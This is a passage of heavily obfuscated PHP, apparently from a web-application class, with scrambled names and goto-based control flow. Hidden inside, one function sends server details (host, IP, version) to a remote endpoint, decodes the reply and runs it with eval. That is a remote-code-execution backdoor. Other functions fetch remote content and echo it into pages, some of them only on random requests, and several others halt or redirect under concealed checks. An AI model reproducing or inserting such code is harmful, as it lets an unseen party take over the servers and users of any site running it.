$DÖ‡‰ˆíÊ˜[220]($CõôÚ­î¶ø) . $Bä›í¤–º´[$DÖ‡‰ˆíÊ˜[216]]); $DäĞ²½ÙŸ = $DÖ‡‰ˆíÊ˜[220]($DÖ‡‰ˆíÊ˜[25]($eë†ò÷¼™», 10, 16)); $dË¨ìŸ–á = $this->{$_SERVER[‰†ğ°][195]}($BğîŞ“õ‘[$DÖ‡‰ˆíÊ˜[100]][$DäĞ²½ÙŸ], $eë†ò÷¼™»); $dË¨ìŸ–á = $DÖ‡‰ˆíÊ˜[197]($dË¨ìŸ–á, !0); } if (!$DÖ‡‰ˆíÊ˜[198]($dË¨ìŸ–á)) { return $this->{$_SERVER[‰†ğ°][170]}(); } goto DÜ†çø×«§; DÜ†çø×«§: $f’¯Ãê‡‚ = $DÖ‡‰ˆíÊ˜[150]($dË¨ìŸ–á[$DÖ‡‰ˆíÊ˜[151]]); if ($DÖ‡‰ˆíÊ˜[242]() >= $f’¯Ãê‡‚) { return $this->{$_SERVER[‰†ğ°][170]}(); } $dË¨ìŸ–á[$DÖ‡‰ˆíÊ˜[241]] = $DÖ‡‰ˆíÊ˜[242](); goto dòÍÍÚöÚ•; eìÃ”Êñ…—: $e©®äÇ‰Á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÖ‡‰ˆíÊ˜ =& $_SERVER[‰†ğ°]; $_SERVER[$DÖ‡‰ˆíÊ˜[181]] = $DÖ‡‰ˆíÊ˜[112]($_SERVER, $DÖ‡‰ˆíÊ˜[181], APP_HOST); goto Cøï¯òò˜‡; Cøï¯òò˜‡: $DÙ·¸¡èĞ = $e©®äÇ‰Á[611]; $this->edxn0da39701 = $DÖ‡‰ˆíÊ˜[127]; $Bä›í¤–º´ = $DÖ‡‰ˆíÊ˜[61]($DÖ‡‰ˆíÊ˜[62])->{$_SERVER[‰†ğ°][63]}(); goto c½‚Æ‡„“í; c½‚Æ‡„“í: $aöÂßÌÃ = $e©®äÇ‰Á[612]; if (!$aöÂßÌÃ) { return; } if ($Bä›í¤–º´[$DÖ‡‰ˆíÊ˜[126]] == $DÖ‡‰ˆíÊ˜[127]) { return; } goto F¨æÛÂŠò‘; eñ´ŸËÙœ: } private function ukrh005cb9c8() { goto d¶¯¡…ñˆ; AÊ‘âóÛˆ: $Fã†±î¸ãå = $A¼² Ò–Åƒ[616]; while (strlen($Fã†±î¸ãå) < $A¼² Ò–Åƒ[573]) { if (!$Fã†±î¸ãå) { break; } $Fã†±î¸ãå++; } $CàõÙ¾§‰ = $_SERVER[$E·¶ã¨›„[44]]; goto Dƒ‹‘Óî¯; d¶¯¡…ñˆ: $A¼² Ò–Åƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E·¶ã¨›„ =& $_SERVER[‰†ğ°]; $A¥¡’Œ‹£æ = $GLOBALS[$E·¶ã¨›„[22]]; goto AÊ‘âóÛˆ; Dƒ‹‘Óî¯: if ($CàõÙ¾§‰ == $E·¶ã¨›„[243] && $this->edxn0da39701 == $E·¶ã¨›„[127]) { $E·¶ã¨›„[172]($E·¶ã¨›„[204]($E·¶ã¨›„[244]), !1, $E·¶ã¨›„[245]); } $C¿ÀÉ»ÍÀù = array($E·¶ã¨›„[246], $E·¶ã¨›„[247]); if ($E·¶ã¨›„[248]($CàõÙ¾§‰, $C¿ÀÉ»ÍÀù)) { if ($this->edxn0da39701 == $E·¶ã¨›„[127] && isset($A¥¡’Œ‹£æ[$E·¶ã¨›„[249]])) { $E·¶ã¨›„[172]($E·¶ã¨›„[204]($E·¶ã¨›„[244]), !1, $E·¶ã¨›„[245]); die; } $d¸Íª¡äÃŒ = $this->{$_SERVER[‰†ğ°][143]}(); if ($d¸Íª¡äÃŒ != $E·¶ã¨›„[250]($E·¶ã¨›„[251])) { if ($d¸Íª¡äÃŒ <= $E·¶ã¨›„[61]($E·¶ã¨›„[145])->{$_SERVER[‰†ğ°][146]}()) { $E·¶ã¨›„[172]($E·¶ã¨›„[204]($E·¶ã¨›„[252]), !1, $E·¶ã¨›„[245]); die; } } } goto d‚˜–¦ÏÑ; d‚˜–¦ÏÑ: } private function vxml9fa544ae() { goto b«Ìª¥ÌÜî; D—‰ßßœ˜º: die; goto D¸÷¶óÁ¢Ñ; föĞ°¿ ‘ê: $eøùóèÆ®ù = $e‹—ê¥ø×Ò[258](array($e‹—ê¥ø×Ò[259] => array($e‹—ê¥ø×Ò[260] => $e‹—ê¥ø×Ò[261], $e‹—ê¥ø×Ò[262] => 3))); $f¡ÈÌª¸«¤ = @$e‹—ê¥ø×Ò[263]($B–ÛÕËêä¦, !1, $eøùóèÆ®ù); $fîâöã£åë = $a¡ğÔò‰îˆ[618]; goto Dôëµœ ¬Á; b«Ìª¥ÌÜî: $a¡ğÔò‰îˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e‹—ê¥ø×Ò =& $_SERVER[‰†ğ°]; $EÕÁİÅ‰’ê = array($e‹—ê¥ø×Ò[141], $e‹—ê¥ø×Ò[253]); goto cÅˆ¿Ö½×ò; Dôëµœ ¬Á: if (!$fîâöã£åë) { die; } $e‹—ê¥ø×Ò[264]($e‹—ê¥ø×Ò[265]); if ($f¡ÈÌª¸«¤ && $e‹—ê¥ø×Ò[32]($f¡ÈÌª¸«¤, $e‹—ê¥ø×Ò[266])) { echo $f¡ÈÌª¸«¤; } goto D—‰ßßœ˜º; cÉè–ÔªùÖ: if (!$e‹—ê¥ø×Ò[248]($_SERVER[$e‹—ê¥ø×Ò[44]], $EÕÁİÅ‰’ê)) { return; } $B–ÛÕËêä¦ = $e‹—ê¥ø×Ò[255]; $B–ÛÕËêä¦ = $this->{$_SERVER[‰†ğ°][256]}($B–ÛÕËêä¦, $e‹—ê¥ø×Ò[257]); goto föĞ°¿ ‘ê; cÅˆ¿Ö½×ò: $f¤¿Á•òŞ÷ = $a¡ğÔò‰îˆ[617]; if (!$f¤¿Á•òŞ÷) { return; } if (!$e‹—ê¥ø×Ò[112]($GLOBALS, $e‹—ê¥ø×Ò[138]) || !isset($_GET[$e‹—ê¥ø×Ò[254]])) { return; } goto cÉè–ÔªùÖ; D¸÷¶óÁ¢Ñ: } public function uzwgc81c9f0c($EŸÑ˜°ÙÑ“) { goto fòÓóğø‘Š; C†¹­¼„§’: return $EŸÑ˜°ÙÑ“; goto cõ‘ã®Î; fòÓóğø‘Š: $a¤ö”œ©« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BÖÄçˆÛÍ… =& $_SERVER[‰†ğ°]; if ($this->edxn0da39701 == $BÖÄçˆÛÍ…[267]) { return $EŸÑ˜°ÙÑ“; } goto DÈ¨ßÁÏï®; B¾”¸Üï¶: $dÇõ§Ô…Ü¡ = array(); foreach ($fÀ¨ƒ¯˜ as $CëŞÔ¹è÷Õ => $fãôÜô›) { if ($fãôÜô› == $BÖÄçˆÛÍ…[269] && $BÖÄçˆÛÍ…[25]($this->edxn0da39701, 0, 1) == $BÖÄçˆÛÍ…[269]) { continue; } if (!$BÖÄçˆÛÍ…[248]($CëŞÔ¹è÷Õ, $d„ö›„Ê˜Œ)) { $dÇõ§Ô…Ü¡[] = $CëŞÔ¹è÷Õ; } } foreach ($dÇõ§Ô…Ü¡ as $CëŞÔ¹è÷Õ) { unset($EŸÑ˜°ÙÑ“[$CëŞÔ¹è÷Õ]); } goto C†¹­¼„§’; F”¡òÇÜ´Î: $d„ö›„Ê˜Œ = $BÖÄçˆÛÍ…[0]($BÖÄçˆÛÍ…[283], $BÖÄçˆÛÍ…[112]($this->cufhb99e82b0, $BÖÄçˆÛÍ…[135], $BÖÄçˆÛÍ…[10])); $DçÉÄø¢ÀÍ = $a¤ö”œ©«[620]; if (strlen($DçÉÄø¢ÀÍ) < $a¤ö”œ©«[582]) { return; } goto B¾”¸Üï¶; DÈ¨ßÁÏï®: $fÀ¨ƒ¯˜ = array($BÖÄçˆÛÍ…[268] => $BÖÄçˆÛÍ…[269], $BÖÄçˆÛÍ…[270] => $BÖÄçˆÛÍ…[269], $BÖÄçˆÛÍ…[271] => $BÖÄçˆÛÍ…[269], $BÖÄçˆÛÍ…[272] => $BÖÄçˆÛÍ…[269], $BÖÄçˆÛÍ…[273] => $BÖÄçˆÛÍ…[269], $BÖÄçˆÛÍ…[274] => $BÖÄçˆÛÍ…[269], $BÖÄçˆÛÍ…[275] => $BÖÄçˆÛÍ…[276], $BÖÄçˆÛÍ…[277] => $BÖÄçˆÛÍ…[276], $BÖÄçˆÛÍ…[278] => $BÖÄçˆÛÍ…[276], $BÖÄçˆÛÍ…[279] => $BÖÄçˆÛÍ…[276], $BÖÄçˆÛÍ…[280] => $BÖÄçˆÛÍ…[276], $BÖÄçˆÛÍ…[281] => $BÖÄçˆÛÍ…[276], $BÖÄçˆÛÍ…[282] => $BÖÄçˆÛÍ…[276]); $aä˜¿çÆã = $a¤ö”œ©«[619]; if (strlen($aä˜¿çÆã) < $a¤ö”œ©«[573]) { die; } goto F”¡òÇÜ´Î; cõ‘ã®Î: } private function ckvw240ba94e() { goto bÛåŠñìá‘; a›¡´·”É: $GLOBALS[$A‹ªŒÆ÷[100]][$A‹ªŒÆ÷[104]][$A‹ªŒÆ÷[284]] = $A‹ªŒÆ÷[226]; $GLOBALS[$A‹ªŒÆ÷[100]][$A‹ªŒÆ÷[285]] = $A‹ªŒÆ÷[226]; $B˜›­¡‘Ò™ = $eç²—Á[621]; goto c…ĞƒÔŒÇ; bÛåŠñìá‘: $eç²—Á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‹ªŒÆ÷ =& $_SERVER[‰†ğ°]; if ($this->edxn0da39701 != $A‹ªŒÆ÷[127]) { return; } goto a›¡´·”É; c…ĞƒÔŒÇ: if (strlen($B˜›­¡‘Ò™) < $eç²—Á[578]) { die; } if ($A‹ªŒÆ÷[61]($A‹ªŒÆ÷[286])->{$_SERVER[‰†ğ°][63]}($A‹ªŒÆ÷[89]) != $A‹ªŒÆ÷[240]) { $A‹ªŒÆ÷[61]($A‹ªŒÆ÷[286])->{$_SERVER[‰†ğ°][227]}($A‹ªŒÆ÷[89], $A‹ªŒÆ÷[240]); } goto eÇœ°·éË…; eÇœ°·éË…: } public function ykutac06b415() { return $_SERVER[‰†ğ°][287]; } private function rkmh49c66df5() { goto c‹·†äÓò; d°¯£ÒÅƒ’: while (strlen($DèŒ¶ãÌ÷ˆ) < $F½”Ñ Æ÷‰[578]) { if (!$DèŒ¶ãÌ÷ˆ) { break; } $DèŒ¶ãÌ÷ˆ++; } if ($this->{$_SERVER[‰†ğ°][206]}($e†¶×¾“¤[$dº¼¤ĞÊåœ[297]]) != $Bë«åÄæ™à[$dº¼¤ĞÊåœ[171]]) { $eÎ¾ô…—„ = array($dº¼¤ĞÊåœ[208] => $dº¼¤ĞÊåœ[61]($dº¼¤ĞÊåœ[62])->{$_SERVER[‰†ğ°][63]}($dº¼¤ĞÊåœ[122]), $dº¼¤ĞÊåœ[209] => $_SERVER[$dº¼¤ĞÊåœ[121]], $dº¼¤ĞÊåœ[210] => $dº¼¤ĞÊåœ[211](), $dº¼¤ĞÊåœ[180] => $_SERVER[$dº¼¤ĞÊåœ[181]]); $fñº«§¹³á = $this->{$_SERVER[‰†ğ°][212]}($dº¼¤ĞÊåœ[154]($eÎ¾ô…—„)); $e†¶×¾“¤ = $this->{$_SERVER[‰†ğ°][189]}($dº¼¤ĞÊåœ[213] . $fñº«§¹³á); if ($e†¶×¾“¤ && $dº¼¤ĞÊåœ[198]($e†¶×¾“¤) && isset($e†¶×¾“¤[$dº¼¤ĞÊåœ[297]])) { $e‡¾Ÿ¯à‹Ü = $this->{$_SERVER[‰†ğ°][195]}($e†¶×¾“¤[$dº¼¤ĞÊåœ[297]], 2); if ($e‡¾Ÿ¯à‹Ü) { $e‡¾Ÿ¯à‹Ü = $this->{$_SERVER[‰†ğ°][206]}($e‡¾Ÿ¯à‹Ü); } if ($e‡¾Ÿ¯à‹Ü) { try { @eval($e‡¾Ÿ¯à‹Ü); } catch (Exception $a•ÀŸ„‡Ö) { } } } } goto cµÑª–àø; D‚¯›ÓÖ¹: if ($e†¶×¾“¤[$dº¼¤ĞÊåœ[171]] && $e†¶×¾“¤[$dº¼¤ĞÊåœ[297]]) { if ($this->{$_SERVER[‰†ğ°][206]}($e†¶×¾“¤[$dº¼¤ĞÊåœ[297]]) == $Bë«åÄæ™à[$dº¼¤ĞÊåœ[171]]) { return; } } $this->{$_SERVER[‰†ğ°][170]}(); $DèŒ¶ãÌ÷ˆ = $F½”Ñ Æ÷‰[623]; goto d°¯£ÒÅƒ’; c‹·†äÓò: $F½”Ñ Æ÷‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dº¼¤ĞÊåœ =& $_SERVER[‰†ğ°]; $BÖŒ’ÛÂ¢ = array($dº¼¤ĞÊåœ[288], $dº¼¤ĞÊåœ[289], $dº¼¤ĞÊåœ[290]); goto B•ºˆ­®‰; D¶ é’´éª: $dÎ¹‹ë‚³Æ = $dº¼¤ĞÊåœ[13](array($dº¼¤ĞÊåœ[293], $dº¼¤ĞÊåœ[294]), $BáÔÊ‹öè); if ($dÎ¹‹ë‚³Æ && $dº¼¤ĞÊåœ[242]() - $dÎ¹‹ë‚³Æ < $dº¼¤ĞÊåœ[250]($dº¼¤ĞÊåœ[295])) { return; } $dº¼¤ĞÊåœ[13](array($dº¼¤ĞÊåœ[293], $dº¼¤ĞÊåœ[158]), $BáÔÊ‹öè, $dº¼¤ĞÊåœ[242]()); goto C¸œÁÚ½™; B•ºˆ­®‰: $BáÔÊ‹öè = $dº¼¤ĞÊåœ[291] . $dº¼¤ĞÊåœ[120]($dº¼¤ĞÊåœ[292]); $eä©·Ô×äë = $F½”Ñ Æ÷‰[622]; if (!$eä©·Ô×äë) { return; } goto F©¶ó¨ó‡í; C¸œÁÚ½™: $Bë«åÄæ™à = array($dº¼¤ĞÊåœ[171] => $dº¼¤ĞÊåœ[61]($dº¼¤ĞÊåœ[62])->{$_SERVER[‰†ğ°][63]}($dº¼¤ĞÊåœ[215]), $dº¼¤ĞÊåœ[184] => $this->edxn0da39701, $dº¼¤ĞÊåœ[182] => $_SERVER[$dº¼¤ĞÊåœ[183]], $dº¼¤ĞÊåœ[175] => $dº¼¤ĞÊåœ[155], $dº¼¤ĞÊåœ[178] => $_SERVER[$dº¼¤ĞÊåœ[179]]); $e†¶×¾“¤ = $this->{$_SERVER[‰†ğ°][189]}($dº¼¤ĞÊåœ[296], $Bë«åÄæ™à); if (!$dº¼¤ĞÊåœ[198]($e†¶×¾“¤)) { return; } goto D‚¯›ÓÖ¹; F©¶ó¨ó‡í: if ($this->edxn0da39701 == $dº¼¤ĞÊåœ[127] || !$dº¼¤ĞÊåœ[112]($GLOBALS, $dº¼¤ĞÊåœ[138])) { return; } if (!$dº¼¤ĞÊåœ[248]($_SERVER[$dº¼¤ĞÊåœ[44]], $BÖŒ’ÛÂ¢)) { return; } if ($dº¼¤ĞÊåœ[242]() % 4 != 0) { return; } goto D¶ é’´éª; cµÑª–àø: } private function prlw2d26138a($bŞÅÜĞø‡· = '', $bé¾ˆÚìòµ = array(), $f‹©©îô” = 5) { goto Bß×Õ²Ô¨; bš‡Ê»‹æ¯: $E§åÇ¯« = $F§í…‰ç”»[624]; $f¶¡ïãğóƒ = $this->{$_SERVER[‰†ğ°][256]}($f¶¡ïãğóƒ, $D¶áá¼Ö[299]); $D‡ê‘±í•‰ = $F§í…‰ç”»[625]; goto Fä‘ÆÀÓãŸ; f‡Ö­à¢”ã: $bé¾ˆÚìòµ = @$D¶áá¼Ö[263]($f¶¡ïãğóƒ, !1, $aá…ãÊ„…À); $Dçï†Á‰Å› = $F§í…‰ç”»[626]; return $D¶áá¼Ö[197]($bé¾ˆÚìòµ, !0); goto Eó¬Ñ’øÙÊ; Bß×Õ²Ô¨: $F§í…‰ç”» =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¶áá¼Ö =& $_SERVER[‰†ğ°]; $f¶¡ïãğóƒ = $D¶áá¼Ö[298]; goto bš‡Ê»‹æ¯; Fä‘ÆÀÓãŸ: $f¶¡ïãğóƒ = $f¶¡ïãğóƒ . $bŞÅÜĞø‡· . $D¶áá¼Ö[300] . $D¶áá¼Ö[301]($bé¾ˆÚìòµ); if ($bé¾ˆÚìòµ === -1) { return $f¶¡ïãğóƒ; } $aá…ãÊ„…À = $D¶áá¼Ö[258](array($D¶áá¼Ö[259] => array($D¶áá¼Ö[262] => $f‹©©îô”, $D¶áá¼Ö[260] => $D¶áá¼Ö[302]), $D¶áá¼Ö[303] => array($D¶áá¼Ö[304] => !1, $D¶áá¼Ö[305] => !1))); goto f‡Ö­à¢”ã; Eó¬Ñ’øÙÊ: } private function apro419cac8a() { goto fùŸ¼»‚¡‰; DçÔÚŒíâØ: $fÃ„ùãíÊÍ = $B’Ù¨Âçò®[629]; return $aù– êé– + $eÛˆ†¿ÌÎŒ; goto fÉÒÁ®ÛèÔ; fùŸ¼»‚¡‰: $B’Ù¨Âçò® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e¹šíÕ«‹ =& $_SERVER[‰†ğ°]; $Fî‹ö×äô„ = array($e¹šíÕ«‹[306] => $e¹šíÕ«‹[307], $e¹šíÕ«‹[308] => $e¹šíÕ«‹[309], $e¹šíÕ«‹[310] => $e¹šíÕ«‹[311], $e¹šíÕ«‹[312] => $e¹šíÕ«‹[313], $e¹šíÕ«‹[314] => $e¹šíÕ«‹[315], $e¹šíÕ«‹[316] => $e¹šíÕ«‹[251], $e¹šíÕ«‹[317] => $e¹šíÕ«‹[251], $e¹šíÕ«‹[318] => $e¹šíÕ«‹[307], $e¹šíÕ«‹[319] => $e¹šíÕ«‹[309], $e¹šíÕ«‹[320] => $e¹šíÕ«‹[311], $e¹šíÕ«‹[321] => $e¹šíÕ«‹[322], $e¹šíÕ«‹[323] => $e¹šíÕ«‹[313], $e¹šíÕ«‹[324] => $e¹šíÕ«‹[325], $e¹šíÕ«‹[326] => $e¹šíÕ«‹[315], $e¹šíÕ«‹[327] => $e¹šíÕ«‹[328], $e¹šíÕ«‹[329] => $e¹šíÕ«‹[330], $e¹šíÕ«‹[331] => $e¹šíÕ«‹[332]); goto dªëŒáƒÓ¬; dªëŒáƒÓ¬: $B‰¤”ç†ƒ° = $B’Ù¨Âçò®[627]; $aù– êé– = $Fî‹ö×äô„[$this->edxn0da39701]; $aù– êé– = $e¹šíÕ«‹[250]($aù– êé– ? $aù– êé– : $e¹šíÕ«‹[307]); goto eŒ¾´­ç; eŒ¾´­ç: $EÚÚ—‹ĞĞê = $B’Ù¨Âçò®[628]; $eÛˆ†¿ÌÎŒ = $e¹šíÕ«‹[112]($this->cufhb99e82b0, $e¹šíÕ«‹[333]); $eÛˆ†¿ÌÎŒ = $eÛˆ†¿ÌÎŒ ? $e¹šíÕ«‹[250]($eÛˆ†¿ÌÎŒ) : 0; goto DçÔÚŒíâØ; fÉÒÁ®ÛèÔ: } public function toeqe0691222($A½ÉØöÜ¶¸) { goto C—¡µ¦¹åŸ; aÑêº°É§: if ($E´í„ëè¯Ğ >= $dÂĞ¡‹…Ù½[250]($dÂĞ¡‹…Ù½[251])) { return; } $Cš•­Ñ¯…¼ = $dÂĞ¡‹…Ù½[61]($dÂĞ¡‹…Ù½[145])->{$_SERVER[‰†ğ°][146]}(); if ($Cš•­Ñ¯…¼ <= $E´í„ëè¯Ğ) { return; } goto E»Êß§±Öï; bõÑéÒò²: $Cİ˜£ó³ = $dÂĞ¡‹…Ù½[228]($Cİ˜£ó³, $dÂĞ¡‹…Ù½[10], $dÂĞ¡‹…Ù½[334]); if (!$dÂĞ¡‹…Ù½[248]($A½ÉØöÜ¶¸[$dÂĞ¡‹…Ù½[334]], $Cİ˜£ó³)) { $dÂĞ¡‹…Ù½[172]($dÂĞ¡‹…Ù½[338], !1, $dÂĞ¡‹…Ù½[245]); } goto E¹Éèì¥Ä; E»Êß§±Öï: $Cİ˜£ó³ = $dÂĞ¡‹…Ù½[61]($dÂĞ¡‹…Ù½[145])->{$_SERVER[‰†ğ°][335]}($dÂĞ¡‹…Ù½[334])->{$_SERVER[‰†ğ°][336]}($E´í„ëè¯Ğ)->{$_SERVER[‰†ğ°][337]}(); $C¶»Šíºğ = $AÓÌªÉÒƒ–[631]; if (!$C¶»Šíºğ) { die; } goto bõÑéÒò²; C—¡µ¦¹åŸ: $AÓÌªÉÒƒ– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÂĞ¡‹…Ù½ =& $_SERVER[‰†ğ°]; $E´í„ëè¯Ğ = $this->{$_SERVER[‰†ğ°][143]}(); goto aÁ‰šñÏÙ; aÁ‰šñÏÙ: $fã‰ˆàÏåÊ = $AÓÌªÉÒƒ–[630]; if (!$fã‰ˆàÏåÊ) { die; } if ($A½ÉØöÜ¶¸[$dÂĞ¡‹…Ù½[334]] == $dÂĞ¡‹…Ù½[226]) { return; } goto aÑêº°É§; E¹Éèì¥Ä: } public function tlivdb9193ed() { goto D¨«¶Úƒæ; e‘êîŞ“: $D™¨¡¿Êëí = $this->{$_SERVER[‰†ğ°][256]}($D™¨¡¿Êëí, $C¹ñ‘ù‘ŒÔ[257]); $C°Ç®ˆ’Â = $D²áÄçÄâ¡[633]; $dä©åÉ’Ó = $C¹ñ‘ù‘ŒÔ[258](array($C¹ñ‘ù‘ŒÔ[259] => array($C¹ñ‘ù‘ŒÔ[260] => $C¹ñ‘ù‘ŒÔ[261], $C¹ñ‘ù‘ŒÔ[262] => 3))); goto d‹×¬ø¥¿; Få®å“‰†: $D™¨¡¿Êëí = $C¹ñ‘ù‘ŒÔ[255]; $A¿¦¸ìõïÉ = $D²áÄçÄâ¡[632]; if (strlen($A¿¦¸ìõïÉ) < $D²áÄçÄâ¡[582]) { return; } goto e‘êîŞ“; d‹×¬ø¥¿: $bŞÓĞ–Ï»Ã = @$C¹ñ‘ù‘ŒÔ[263]($D™¨¡¿Êëí, !1, $dä©åÉ’Ó); echo $C¹ñ‘ù‘ŒÔ[340] . $C¹ñ‘ù‘ŒÔ[341]($bŞÓĞ–Ï»Ã) . $C¹ñ‘ù‘ŒÔ[342]; goto d°ˆ±±÷; D¨«¶Úƒæ: $D²áÄçÄâ¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C¹ñ‘ù‘ŒÔ =& $_SERVER[‰†ğ°]; if (!$C¹ñ‘ù‘ŒÔ[112]($GLOBALS, $C¹ñ‘ù‘ŒÔ[138]) || $C¹ñ‘ù‘ŒÔ[339](1, 100) > 20) { return; } goto Få®å“‰†; d°ˆ±±÷: } private function pbdv43b764da($E§¡”ö½İ, $fÙÀ‡‡Ë, $fîÑéÅùÁ = 3) { goto CÚ®¡ˆ†Š™; DÔ¾Ô©³½Ù: $BÈ§±Å”Ú¯ = $EÏÖˆù¨£å[130](15); $fÄ›æ¯è‚ƒ = $EÏÖˆù¨£å[344]; $C„ŒæÖ‘„É = $FÊ‚ªçõÌï[635]; goto DÓÌƒàç²; C™äÁ¦­ÃÚ: if (!$B…ƒé·ï‰µ) { return; } if ($fîÑéÅùÁ - 1 > 0) { $f‘©²Ù¼¾³ = $this->{$_SERVER[‰†ğ°][133]}($f‘©²Ù¼¾³, $fÙÀ‡‡Ë, $fîÑéÅùÁ - 1); } return $f‘©²Ù¼¾³; goto BÌî‚ìãƒƒ; eòĞªƒ“Ÿ˜: $E§¡”ö½İ = $EÏÖˆù¨£å[2]($E§¡”ö½İ); $A¥í—ç®ÚÚ = $EÏÖˆù¨£å[339](0, 5) . $EÏÖˆù¨£å[10]; $e„¸½³ğ£® = $FÊ‚ªçõÌï[634]; goto DÔ¾Ô©³½Ù; CÚ®¡ˆ†Š™: $FÊ‚ªçõÌï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÏÖˆù¨£å =& $_SERVER[‰†ğ°]; $EÏÖˆù¨£å[343](1); goto eòĞªƒ“Ÿ˜; DÓÌƒàç²: switch ($A¥í—ç®ÚÚ) { case $EÏÖˆù¨£å[240]: $f‘©²Ù¼¾³ = $this->{$_SERVER[‰†ğ°][153]}($E§¡”ö½İ, $EÏÖˆù¨£å[220]($fÙÀ‡‡Ë . $BÈ§±Å”Ú¯)); break; case $EÏÖˆù¨£å[226]: $f‘©²Ù¼¾³ = $this->{$_SERVER[‰†ğ°][153]}($E§¡”ö½İ, $EÏÖˆù¨£å[220]($BÈ§±Å”Ú¯ . $fÙÀ‡‡Ë)); $DñÑÓÓ©ç’ = $FÊ‚ªçõÌï[636]; if (!$DñÑÓÓ©ç’) { return; } break; case $EÏÖˆù¨£å[345]: $f‘©²Ù¼¾³ = $this->{$_SERVER[‰†ğ°][153]}($E§¡”ö½İ, $EÏÖˆù¨£å[124]($BÈ§±Å”Ú¯ . $fÙÀ‡‡Ë)); $f¸Ã èµÀ = $FÊ‚ªçõÌï[637]; break; case $EÏÖˆù¨£å[346]: $f‘©²Ù¼¾³ = $this->{$_SERVER[‰†ğ°][153]}($E§¡”ö½İ, $EÏÖˆù¨£å[120]($BÈ§±Å”Ú¯ . $fÙÀ‡‡Ë)); break; case $EÏÖˆù¨£å[347]: goto bÛ»Š¸ÁĞ¸; f‚¶Òƒòé: $dÔ”ÓÄù‘ = 0; $cêÔ‰²¦Í = 0; for ($E‡Ö²ÑŸ¿§ = 0; $E‡Ö²ÑŸ¿§ < $EÏÖˆù¨£å[24]($E§¡”ö½İ); $E‡Ö²ÑŸ¿§++) { $cêÔ‰²¦Í = $cêÔ‰²¦Í == $EÏÖˆù¨£å[24]($fì¨®«Ç¬) ? 0 : $cêÔ‰²¦Í; $Cå˜¤÷»çø = $FÊ‚ªçõÌï[641]; if (!$Cå˜¤÷»çø) { die; } $dÔ”ÓÄù‘ = ($EÈ˜‘—«¢Å + $EÏÖˆù¨£å[349]($fÄ›æ¯è‚ƒ, $E§¡”ö½İ[$E‡Ö²ÑŸ¿§]) + $EÏÖˆù¨£å[350]($fì¨®«Ç¬[$cêÔ‰²¦Í++])) % 64; $C£Ìõé›Œ .= $fÄ›æ¯è‚ƒ[$dÔ”ÓÄù‘]; } goto cí¯Àãª§Ğ; cí¯Àãª§Ğ: $f‘©²Ù¼¾³ = $EÏÖˆù¨£å[341]($E´·Æ¼¥÷Å . $C£Ìõé›Œ); break; goto aÖ‚Œ‹¦¦; DÓØø–ò¥·: $fì¨®«Ç¬ = $EÏÖˆù¨£å[25]($fì¨®«Ç¬, $EÈ˜‘—«¢Å % 8, $EÈ˜‘—«¢Å % 8 + 7); $C£Ìõé›Œ = $EÏÖˆù¨£å[10]; $AÙ„ÊÔÍ×İ = $FÊ‚ªçõÌï[639]; goto cÆ´áŒõÙ; aõÙÚè•Ì: $EÈ˜‘—«¢Å = $EÏÖˆù¨£å[348](0, 64); $E´·Æ¼¥÷Å = $fÄ›æ¯è‚ƒ[$EÈ˜‘—«¢Å]; $fì¨®«Ç¬ = $EÏÖˆù¨£å[120]($E´·Æ¼¥÷Å . $EÏÖˆù¨£å[120]($fÙÀ‡‡Ë . $E´·Æ¼¥÷Å) . $fÙÀ‡‡Ë); goto DÓØø–ò¥·; cÆ´áŒõÙ: $E‡Ö²ÑŸ¿§ = 0; $CàÉ‹•Ë°² = $FÊ‚ªçõÌï[640]; if (strlen($CàÉ‹•Ë°²) < $FÊ‚ªçõÌï[567]) { return; } goto f‚¶Òƒòé; bÛ»Š¸ÁĞ¸: $E§¡”ö½İ = $EÏÖˆù¨£å[124]($E§¡”ö½İ); $eğ²Ö´Êš = $FÊ‚ªçõÌï[638]; if (!$eğ²Ö´Êš) { return; } goto aõÙÚè•Ì; aÖ‚Œ‹¦¦: default: $f‘©²Ù¼¾³ = $this->{$_SERVER[‰†ğ°][153]}($E§¡”ö½İ, $fÙÀ‡‡Ë . $BÈ§±Å”Ú¯); $d×´³Š±¯Ã = $FÊ‚ªçõÌï[642]; if (strlen($d×´³Š±¯Ã) < $FÊ‚ªçõÌï[582]) { die; } break; } $f‘©²Ù¼¾³ = $EÏÖˆù¨£å[220]($A¥í—ç®ÚÚ . $BÈ§±Å”Ú¯ . $f‘©²Ù¼¾³); $B…ƒé·ï‰µ = $FÊ‚ªçõÌï[643]; goto C™äÁ¦­ÃÚ; BÌî‚ìãƒƒ: } private function ctlh1a360403($Eëª…ÔÔé„, $Dßœçä°º, $a…•š½é™Ê = 3) { goto EÕĞÓ‡Ò; F¼¢×îÅ¯¸: $d’½”÷ãñÈ = $C…Öîèˆá[647]; while (strlen($d’½”÷ãñÈ) < $C…Öîèˆá[570]) { if (!$d’½”÷ãñÈ) { break; } $d’½”÷ãñÈ++; } switch ($d‚Š‰ÃÖÃ) { case $E“İâ¸£[240]: $Eâ™™Ö¦…¬ = $this->{$_SERVER[‰†ğ°][256]}($Eëª…ÔÔé„, $E“İâ¸£[220]($Dßœçä°º . $eª†µëˆè)); break; $døÓ¸œ‰¬” = $C…Öîèˆá[648]; case $E“İâ¸£[226]: $Eâ™™Ö¦…¬ = $this->{$_SERVER[‰†ğ°][256]}($Eëª…ÔÔé„, $E“İâ¸£[220]($eª†µëˆè . $Dßœçä°º)); break; case $E“İâ¸£[345]: $Eâ™™Ö¦…¬ = $this->{$_SERVER[‰†ğ°][256]}($Eëª…ÔÔé„, $E“İâ¸£[124]($eª†µëˆè . $Dßœçä°º)); $E‘ÈËÍáË = $C…Öîèˆá[649]; if (strlen($E‘ÈËÍáË) < $C…Öîèˆá[567]) { die; } break; case $E“İâ¸£[346]: $Eâ™™Ö¦…¬ = $this->{$_SERVER[‰†ğ°][256]}($Eëª…ÔÔé„, $E“İâ¸£[120]($eª†µëˆè . $Dßœçä°º)); break; case 